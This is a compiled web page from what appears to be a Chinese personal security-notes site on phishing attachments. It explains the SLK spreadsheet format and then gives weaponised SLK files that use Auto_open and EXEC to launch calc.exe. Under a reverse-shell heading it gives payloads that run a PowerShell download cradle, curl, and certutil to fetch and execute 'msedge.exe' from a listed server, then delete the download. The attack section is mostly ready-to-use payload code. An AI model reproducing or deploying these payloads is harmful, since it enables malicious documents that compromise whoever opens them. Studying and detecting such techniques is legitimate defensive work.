import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as l,o as p,c as r,a as e,d as n,b as s,e as o}from"./app-BT-bWAve.js";const c={},i=e("h1",{id:"slk",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#slk"},[e("span",null,"SLK")])],-1),d=e("h2",{id:"概述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#概述"},[e("span",null,"概述")])],-1),u={href:"https://filext.com/zh/wenjian-kuozhan-ming/SLK",target:"_blank",rel:"noopener noreferrer"},m=e("hr",null,null,-1),h={href:"https://www.antiy.com/response/20200701.html",target:"_blank",rel:"noopener noreferrer"},k=o(`<p>SLK 文件大多属于 Microsoft 的 Excel。 SLK 文件是符号链接文件，它是由 Microsoft 开发并主要由 Excel 使用的格式。该文件格式仅使用可显示的 ANSI 字符来存储数据，并允许其他应用程序轻松处理其内容。</p><p>在2007年XLSX引入之前且XLS文件是私有文件格式的时候，SLK是XLS的开放格式替代品，对于最终用户来说，SLK文件看起来像一个Excel文档。</p><ul><li>主要用途: SLK文件格式主要用于程序之间（如微软 Excel 和 Lotus 1-2-3）传输数据。由于这些文件仅使用可显示的 ANSI 字符，因此程序和用户都很容易解释它们，并且可以使用简单的文本编辑器（例如记事本）查看或修改。</li><li>预览与编辑软件: 虽然该格式主要由 Microsoft Excel 使用，但其他程序（例如 OpenOffice、LibreOffice 和 Gnumeric）也支持该文件格式的变体。</li><li>文件结构：SLK 文件中的数据以纯文本形式存储，并以分号分隔的值进行组织。要在单元格中包含文字分号，可以使用前面的分号对其进行转义，这将导致字符被视为单元格的一部分，而不是文件结构的一部分。</li></ul><p>例如:</p><div class="language-mathematica line-numbers-mode" data-ext="mathematica" data-title="mathematica"><pre class="language-mathematica"><code>ID<span class="token operator">;</span>P
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y1<span class="token operator">;</span>K<span class="token string">&quot;Header1&quot;</span>
C<span class="token operator">;</span>X2<span class="token operator">;</span>Y1<span class="token operator">;</span>K<span class="token string">&quot;Header2&quot;</span>
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y2<span class="token operator">;</span>K<span class="token string">&quot;Data1&quot;</span>
C<span class="token operator">;</span>X2<span class="token operator">;</span>Y2<span class="token operator">;</span>K<span class="token string">&quot;Data2&quot;</span>
E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>ID;P</code> 是文件的标识符和参数</li><li><code>C;X1;Y1;K&quot;Header1&quot;</code> 表示第1列第1行的单元格内容是&quot;Header1&quot; <ul><li><code>C</code> - <code>Cell</code> 表示这是一行单元格数据</li><li><code>X1</code> 表示单元格所在的列, 第 1 列</li><li><code>Y1</code> 表示单元格所在的行, 第 1 行</li><li><code>K&quot;Header1&quot;</code>：表示单元格的内容，<code>K</code> 是 &quot;Konstant&quot;（常量）的缩写，<code>&quot;Header1&quot;</code> 是该单元格的实际内容，即文字 &quot;Header1&quot;</li></ul></li><li><code>C;X2;Y1;K&quot;Header2&quot;</code> 表示第2列第1行的单元格内容是&quot;Header2&quot;</li><li><code>C;X1;Y2;K&quot;Data1&quot;</code> 表示第1列第2行的单元格内容是&quot;Data1&quot;</li><li><code>C;X2;Y2;K&quot;Data2&quot;</code> 表示第2列第2行的单元格内容是&quot;Data2&quot;</li><li><code>E</code> 表示文件结束</li></ul><hr><h2 id="调起计算器" tabindex="-1"><a class="header-anchor" href="#调起计算器"><span>调起计算器</span></a></h2><div class="language-mathematica line-numbers-mode" data-ext="mathematica" data-title="mathematica"><pre class="language-mathematica"><code>ID<span class="token operator">;</span>P
O<span class="token operator">;</span>E
NN<span class="token operator">;</span>NAuto_open<span class="token operator">;</span>ER101C1<span class="token operator">;</span>KOut Flank<span class="token operator">;</span>F
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y101<span class="token operator">;</span>K0<span class="token operator">;</span>EEXEC<span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span>
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y102<span class="token operator">;</span>K0<span class="token operator">;</span>EHALT<span class="token punctuation">(</span><span class="token punctuation">)</span>
E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>NN;NAuto_open;ER101C1;KOut Flank;F</code><ul><li><strong>NN</strong>：名称定义行，定义一个名称及其范围</li><li><strong>N</strong>：后面的 <code>Auto_open</code> 表示名称。此处定义了一个名称 <code>Auto_open</code></li><li><strong>ER101C1</strong>：范围定义，表示范围从 <code>R101C1</code> 开始，即第101行第1列。前面的 <code>E</code> 可能表示扩展的范围定义</li><li><strong>KOut Flank</strong>：为名称 <code>Auto_open</code> 赋值，值为 <code>Out Flank</code></li><li><strong>F</strong>：标志，可能用于特定标识或格式设置</li></ul></li><li><code>C;X1;Y101;K0;EEXEC(&quot;calc.exe&quot;)</code><ul><li><strong>K0</strong>：表示单元格的内容，这里是数值 <code>0</code></li><li><strong>EEXEC(&quot;calc.exe&quot;)</strong>：执行命令 <code>EXEC(&quot;calc.exe&quot;)</code>，表示在读取和执行此SLK文件时将运行 <code>calc.exe</code>，即打开计算器程序</li></ul></li><li><code>C;X1;Y102;K0;EHALT()</code></li><li><strong>K0</strong>：表示单元格的内容，这里是数值 <code>0</code>。</li><li><strong>EHALT()</strong>：执行命令 <code>HALT()</code>，表示停止或结束操作。这通常用于结束脚本或宏的执行。</li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407081539970.png" alt="image-20240708153941228"></p><hr><h2 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell"><span>反弹Shell</span></a></h2>`,13),g={href:"https://www.antiy.com/response/20200701.html",target:"_blank",rel:"noopener noreferrer"},v=o(`<p><code>http://100.1.1.131:8000/powershell_curl_reverse_shell.txt</code>:</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code>curl http:<span class="token operator">/</span><span class="token operator">/</span>100<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>131:8000/download/msedge<span class="token punctuation">.</span>exe <span class="token operator">-</span>o msedge<span class="token punctuation">.</span>exe<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span>msedge<span class="token punctuation">.</span>exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>slk_reverse_shell.slk</code>:</p><div class="language-mathematica line-numbers-mode" data-ext="mathematica" data-title="mathematica"><pre class="language-mathematica"><code>ID<span class="token operator">;</span>P
O<span class="token operator">;</span>E
NN<span class="token operator">;</span>NAuto_open<span class="token operator">;</span>ER101C1<span class="token operator">;</span>KOut Flank<span class="token operator">;</span>F
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y101<span class="token operator">;</span>K0<span class="token operator">;</span>EEXEC<span class="token punctuation">(</span><span class="token string">&quot;powershell.exe -nop -c IEX((new-object Net.WebClient).DownloadString(&#39;http://100.1.1.131:8000/download/powershell_curl_reverse_shell.txt&#39;))&quot;</span><span class="token punctuation">)</span>
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y102<span class="token operator">;</span>K0<span class="token operator">;</span>EHALT<span class="token punctuation">(</span><span class="token punctuation">)</span>
E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>PS: 无法成功执行此命令, 原因未知</p><p>PS: 命令替换成 <code>powershell.exe -nop -c IEX(&#39;calc.exe&#39;)</code> 是可以正常弹出计算器的</p></blockquote><hr><p><code>shell.cmd</code></p><div class="language-cmd line-numbers-mode" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>slk_reverse_shell_shell_cmd_file_win1252.slk</code></p><div class="language-mathematica line-numbers-mode" data-ext="mathematica" data-title="mathematica"><pre class="language-mathematica"><code>ID<span class="token operator">;</span>P
O<span class="token operator">;</span>E
NN<span class="token operator">;</span>NAuto_open<span class="token operator">;</span>ER101C1<span class="token operator">;</span>KOut Flank<span class="token operator">;</span>F
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y101<span class="token operator">;</span>K0<span class="token operator">;</span>EEXEC<span class="token punctuation">(</span><span class="token string">&quot;c:/temp/shell.cmd&quot;</span><span class="token punctuation">)</span>
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y102<span class="token operator">;</span>K0<span class="token operator">;</span>EHALT<span class="token punctuation">(</span><span class="token punctuation">)</span>
E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><code>slk_reverse_shell_certutil_win1252.slk</code></p><div class="language-mathematica line-numbers-mode" data-ext="mathematica" data-title="mathematica"><pre class="language-mathematica"><code>ID<span class="token operator">;</span>P
O<span class="token operator">;</span>E
NN<span class="token operator">;</span>NAuto_open<span class="token operator">;</span>ER101C1<span class="token operator">;</span>KOut Flank<span class="token operator">;</span>F
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y101<span class="token operator">;</span>K0<span class="token operator">;</span>EEXEC<span class="token punctuation">(</span><span class="token string">&quot;cmd.exe /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete&quot;</span><span class="token punctuation">)</span>
C<span class="token operator">;</span>X1<span class="token operator">;</span>Y102<span class="token operator">;</span>K0<span class="token operator">;</span>EHALT<span class="token punctuation">(</span><span class="token punctuation">)</span>
E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407081906201.png" alt="image-20240708190618861"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407081906298.png" alt="image-20240708190649128"></p><hr><h2 id="参考材料" tabindex="-1"><a class="header-anchor" href="#参考材料"><span>参考材料</span></a></h2>`,17),E={href:"https://www.google.com/search?q=SLK+%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC&sca_esv=93393d72ee4371e2&biw=1912&bih=972&sxsrf=ADLYWIKrEcaS-mRNnan1YdFHckVXFvvNkA%3A1720173801763&ei=6cSHZqSlLqmnuvQPua2uoA4&ved=0ahUKEwjkvZ_j0o-HAxWpk44IHbmWC-Q4FBDh1QMIDw&uact=5&oq=SLK+%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC&gs_lp=Egxnd3Mtd2l6LXNlcnAiEFNMSyDmlofmoaPpkpPpsbwyCBAhGKABGMMESONEUNg7WMxBcAJ4AJABAJgBwAKgAagQqgEFMi01LjK4AQPIAQD4AQGYAgOgArsCwgIKEAAYgAQYsAMYDZgDAIgGAZAGAZIHBTIuMC4xoAfJDQ&sclient=gws-wiz-serp",target:"_blank",rel:"noopener noreferrer"},_={href:"https://youngrichog.github.io/2021/06/16/Macos-Office%E6%94%BB%E9%98%B2/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/",target:"_blank",rel:"noopener noreferrer"},q={href:"https://www.anquanke.com/post/id/87013",target:"_blank",rel:"noopener noreferrer"},x={href:"https://www.antiy.com/response/20200701.html",target:"_blank",rel:"noopener noreferrer"},f=e("hr",null,null,-1);function A(K,w){const a=l("ExternalLinkIcon");return p(),r("div",null,[i,d,e("blockquote",null,[e("p",null,[e("a",u,[n("如何在没有 Excel 的情况下打开 SLK 文件 (filext.com)"),s(a)])]),m,e("p",null,[e("a",h,[n("安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)"),s(a)])])]),k,e("blockquote",null,[e("p",null,[e("a",g,[n("安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)"),s(a)])])]),v,e("blockquote",null,[e("p",null,[e("a",E,[n("SLK 文档钓鱼 - Google Search"),s(a)])])]),e("ul",null,[e("li",null,[e("a",_,[n("Macos Office攻防 | YoungRichOG"),s(a)])]),e("li",null,[e("a",b,[n("关于文档钓鱼的学习 | 藏青's BLOG (cangqingzhe.github.io)"),s(a)])]),e("li",null,[e("a",q,[n("【技术分享】如何绕过受保护视图发起钓鱼攻击-安全客 - 安全资讯平台 (anquanke.com)"),s(a)])]),e("li",null,[e("a",x,[n("安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)"),s(a)])])]),f])}const S=t(c,[["render",A],["__file","index.html.vue"]]),N=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/SLK/","title":"SLK","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"概述","slug":"概述","link":"#概述","children":[]},{"level":2,"title":"调起计算器","slug":"调起计算器","link":"#调起计算器","children":[]},{"level":2,"title":"反弹Shell","slug":"反弹shell","link":"#反弹shell","children":[]},{"level":2,"title":"参考材料","slug":"参考材料","link":"#参考材料","children":[]}],"git":{"createdTime":1720696610000,"updatedTime":1720696610000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":3.88,"words":1164},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/SLK/index.md","localizedDate":"2024年7月11日","excerpt":"\\n<h2>概述</h2>\\n<blockquote>\\n<p><a href=\\"https://filext.com/zh/wenjian-kuozhan-ming/SLK\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">如何在没有 Excel 的情况下打开 SLK 文件 (filext.com)</a></p>\\n<hr>\\n<p><a href=\\"https://www.antiy.com/response/20200701.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)</a></p>\\n</blockquote>"}');export{S as comp,N as data};
